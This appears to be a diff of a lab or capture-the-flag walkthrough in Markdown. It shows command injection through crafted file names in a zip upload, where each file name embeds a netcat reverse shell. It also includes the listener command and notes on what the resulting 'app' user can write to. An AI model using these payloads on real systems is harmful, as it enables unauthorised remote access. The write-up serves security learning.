@@ -59,10 +59,11 @@ printf "@ joergen.jpg\n@=\';nc <your IP address> 4444 -e \`which bash\`;#'.jpg\n
 
 **option 2**
 ```
-touch \'\;nc\ <your IP address68\ 4444\ -e\ \`which\ bash\`\;\'.jpg
-zip joergen.zip \'\;nc\ 93.211.51.68\ 4444\ -e\ \`which\ bash\`\;\'.jpg
+touch \'\;nc\ <your IP address>\ 4444\ -e\ \`which\ bash\`\;\'.jpg
+zip joergen.zip \'\;nc\ <your IP address>\ 4444\ -e\ \`which\ bash\`\;\'.jpg
 ```
 
+**common part**
 Start the reverse shell listener on your local device:
 ```
 nc -lnvp 4444
@@ -75,11 +76,11 @@ Now you have in the reverse shell listener an interactive shell as user `app`.
 The user `app` has write access to `/tmp` and `/home/app`.
 In addition the user has write access to `/usr/local/bundle`, where the web server is located.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTQzNjYyNzQwMywxNDQwMDk3MDgzLC05Mz
-U4MTMyODgsLTYxMzQ0OTY1NiwtMTA1MjE2MzYxNywtMTc2MzU0
-MTM1NSwxNjA3MzQ4NTE0LC04MjMwNTA4NjEsMTI5MzcyMDQzOS
-wxMzk1Nzk0ODI0LC0xNTk5MjU0NDE1LC02MTkyOTc0MTEsLTU3
-NjYxMDA3NSwyMTA3NTI5ODQ2LDkyMjE0NDM1LC0zOTg0OTE0Nj
-EsMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkzMzM2MTc4NywtMTQ2
-NzYxNTI2Ml19
+eyJoaXN0b3J5IjpbLTExNjQ1MjMwMjUsMTQ0MDA5NzA4MywtOT
+M1ODEzMjg4LC02MTM0NDk2NTYsLTEwNTIxNjM2MTcsLTE3NjM1
+NDEzNTUsMTYwNzM0ODUxNCwtODIzMDUwODYxLDEyOTM3MjA0Mz
+ksMTM5NTc5NDgyNCwtMTU5OTI1NDQxNSwtNjE5Mjk3NDExLC01
+NzY2MTAwNzUsMjEwNzUyOTg0Niw5MjIxNDQzNSwtMzk4NDkxND
+YxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3ODcsLTE0
+Njc2MTUyNjJdfQ==
 -->
